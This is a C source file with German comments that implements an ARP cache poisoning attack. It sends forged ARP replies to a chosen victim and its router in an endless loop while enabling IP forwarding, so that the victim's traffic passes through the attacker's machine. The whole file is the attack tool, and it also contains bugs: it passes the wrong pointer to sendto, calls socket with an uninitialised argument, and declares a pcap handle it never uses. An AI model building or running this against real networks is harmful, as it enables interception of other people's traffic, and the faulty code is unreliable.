#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/if_packet.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pcap.h>

void print_mac(const unsigned char *mac){
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Format: "AA:BB:CC:DD:EE:FF"
int mac_aton(const char *mac_str, unsigned char *mac_bytes) {
    unsigned int values[6];
    int i;

    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return -1;
    }

    for (i = 0; i < 6; i++) {
        mac_bytes[i] = (unsigned char) values[i];
    }
    return 0;
}

struct arp_packet {
    struct ethhdr eth_header;
    struct arphdr arp_header;
    unsigned char sender_mac[ETH_ALEN];
    struct in_addr sender_ip;
    unsigned char target_mac[ETH_ALEN];
    struct in_addr target_ip;
};

int get_interface_info(const char* ifac_n, unsigned char *local_m_buffer, int *if_index_buffer){

    int ioctl_sockfd;
    struct ifreq if_idx;
    struct ifreq if_mac;

    ioctl_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (ioctl_sockfd == -1) {
        perror("ioctl_sockfd creation");
        return -1;
    }

    printf("ioctl Socket erstellt.\n");
    
        memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, ifac_n, IFNAMSIZ - 1);
    if_idx.ifr_name[IFNAMSIZ - 1] = '\0';
    if (ioctl(ioctl_sockfd, SIOCGIFINDEX, &if_idx) == -1) {
        perror("SIOCGIFINDEX");
        close(ioctl_sockfd);
        return -1;
    }
    *if_index_buffer = if_idx.ifr_ifindex; // Korrigiert
    printf("Interface: %s\nIndex: %d\n", ifac_n, *if_index_buffer);

    memset(&if_mac, 0, sizeof(struct ifreq));
    strncpy(if_mac.ifr_name, ifac_n, IFNAMSIZ - 1);
    if_mac.ifr_name[IFNAMSIZ - 1] = '\0';
    if (ioctl(ioctl_sockfd, SIOCGIFHWADDR, &if_mac) == -1) { perror("SIOCGIFHWADDR");
        close(ioctl_sockfd);
        return -1;
    }
    memcpy(local_m_buffer, if_mac.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("Eigene MAC-Adresse: ");
    print_mac(local_m_buffer);

    close(ioctl_sockfd);
    printf("ioctl Socket geschlossen.\n");
    return 0;
}
void build_arp_package(struct arp_packet *arp_p, unsigned char *target_mac_bytes, unsigned char *local_mac, const char *spoof_ip_str, const char *target_ip_str){

    memcpy(arp_p->eth_header.h_dest, target_mac_bytes, ETH_ALEN);
    memcpy(arp_p->eth_header.h_source, local_mac, ETH_ALEN);
    arp_p->eth_header.h_proto = htons(ETH_P_ARP);

    printf("Ethernet-Header erstellt.\n");

    arp_p->arp_header.ar_hrd = htons(ARPHRD_ETHER);
    arp_p->arp_header.ar_pro = htons(ETH_P_IP);
    arp_p->arp_header.ar_hln = ETH_ALEN;
    arp_p->arp_header.ar_pln = sizeof(struct in_addr);
    arp_p->arp_header.ar_op = htons(ARPOP_REPLY);

    printf("ARP-Header erstellt.\n");

    memcpy(arp_p->sender_mac, local_mac, ETH_ALEN);
    arp_p->sender_ip.s_addr = inet_addr(spoof_ip_str);

    memcpy(arp_p->target_mac, target_mac_bytes, ETH_ALEN);
    arp_p->target_ip.s_addr = inet_addr(target_ip_str);

    printf("ARP-Payload gefüllt.\n");
}

int send_arp_package(int raw_sockfd, struct arp_packet *arp_p, int if_index, unsigned char *target_mac_bytes){
    struct sockaddr_ll sa_ll;
    memset(&sa_ll, 0, sizeof(sa_ll));
    sa_ll.sll_family = AF_PACKET;
    sa_ll.sll_protocol = htons(ETH_P_ARP);
    sa_ll.sll_ifindex = if_index;
    sa_ll.sll_hatype = ARPHRD_ETHER;
    sa_ll.sll_pkttype = PACKET_OTHERHOST; // PACKET_OTHERHOST ist hier in Ordnung
    sa_ll.sll_halen = ETH_ALEN;
    memcpy(sa_ll.sll_addr, target_mac_bytes, ETH_ALEN);

    if (sendto(raw_sockfd, &arp_p, sizeof(struct arp_packet), 0,
               (struct sockaddr*)&sa_ll, sizeof(sa_ll)) == -1) {
        perror("sendto");
        return -1;
    }
    printf("ARP-Paket gesendet.\n");
    return 0;
}

/**
 * @brief Aktiviert oder deaktiviert das IP-Forwarding im Linux-Kernel.
 *
 * @param enable Wenn 1, wird IP-Forwarding aktiviert. Wenn 0, wird es deaktiviert.
 * @return 0 bei Erfolg, -1 bei Fehler.
 */
int set_ip_forwarding(int enable) {
    FILE *fp;
    const char *path = "/proc/sys/net/ipv4/ip_forward";
    char value_str[2]; // Für "0" oder "1" + Nullterminator

    // Datei zum Schreiben öffnen
    fp = fopen(path, "w");
    if (fp == NULL) {
        fprintf(stderr, "Fehler: Kann '%s' nicht öffnen. Stellen Sie sicher, dass Sie Root-Rechte haben.\n", path);
        return -1;
    }

    // Wert schreiben
    if (enable) {
        strcpy(value_str, "1");
        printf("[INFO] Versuche, IP-Forwarding zu aktivieren...\n");
    } else {
        strcpy(value_str, "0");
        printf("[INFO] Versuche, IP-Forwarding zu deaktivieren...\n");
    }

    if (fputs(value_str, fp) == EOF) {
        fprintf(stderr, "Fehler: Kann Wert nicht in '%s' schreiben.\n", path);
        fclose(fp);
        return -1;
    }

    // Datei schließen
    if (fclose(fp) == EOF) {
        fprintf(stderr, "Fehler: Kann '%s' nicht schließen.\n", path);
        return -1; // Könnte auch ein fataler Fehler sein, da der Status unklar ist
    }

    printf("[INFO] IP-Forwarding auf %d gesetzt.\n", enable);
    return 0;
}

int main(int argc, char *argv[])
{
 if (argc != 5) { // Jetzt exakt 5 Argumente (Programmname + 4 Parameter)
        fprintf(stderr, "Usage: %s <target_ip> <router_ip> <target_mac> <router_mac>\n", argv[0]);
        exit(1);
    }
    const char* iface_name = "wlan0";
    const char* target_ip_str = argv[1];
    const char* spoof_ip_str = argv[2];

    struct arp_packet arp_p;
    struct arp_packet arp_p2;

    int raw_sockfd;
    int in_sockfd;
    int if_index;
    unsigned char local_mac[ETH_ALEN];
    unsigned char target_mac_bytes[ETH_ALEN];
    unsigned char target_2_mac_bytes[ETH_ALEN];

    pcap_t *handle; // Handler für die pcap-Sizung
    char errbuf[PCAP_ERRBUF_SIZE]; // Buffer für die Fehlermeldungen

    if (mac_aton(argv[3], target_mac_bytes) != 0 || mac_aton(argv[4], target_2_mac_bytes) != 0) {
        fprintf(stderr, "Error: Invalid target MAC address format. Use AA:BB:CC:DD:EE:FF\n");
        return 1;
    }

    raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_sockfd == -1) {
        perror("raw_sockfd creation");
        return 1;
    }
    printf("Raw Socket für ARP-Pakete erstellt.\n");

    if(get_interface_info(iface_name, local_mac, &if_index) == -1){
        perror("own-interface-info");
        return 1;
    }
    
    build_arp_package(&arp_p, target_mac_bytes, local_mac, spoof_ip_str, target_ip_str); // target 1
    build_arp_package(&arp_p2, target_2_mac_bytes, local_mac, target_ip_str, spoof_ip_str); // target 2
   
    if(socket(in_sockfd, SOCK_RAW, htons(ETH_P_ALL))){
        perror("socket");
        close(raw_sockfd);
        return 1;
    }
    printf("Capture Socket erstellt\n");

    // Ipv4 forwarding sysctl auf 1 setzen
    if(set_ip_forwarding(1) == -1){
        perror("ip_forward");
        close(raw_sockfd);
        close(in_sockfd);
        return 1;
    }

    while(1){

        if(send_arp_package(raw_sockfd, &arp_p, if_index, target_mac_bytes) == -1){
            fprintf(stderr, "Error sending ARP packet to target. Exiting poisoning loop.\n");
            break;
        }

        if(send_arp_package(raw_sockfd, &arp_p2, if_index, target_2_mac_bytes) == -1){
            fprintf(stderr, "Error sending ARP packet to router. Exiting poisoning loop.\n");
            break;
        }
        sleep(2); 
    }

    // Ipv4 forwarding sysctl auf 0 setzen
    if(set_ip_forwarding(0) == -1){
        perror("ip_forward");
        close(raw_sockfd);
        close(in_sockfd);
        return 1;
    }

    close(raw_sockfd);
    close(in_sockfd);
    return 0;
}
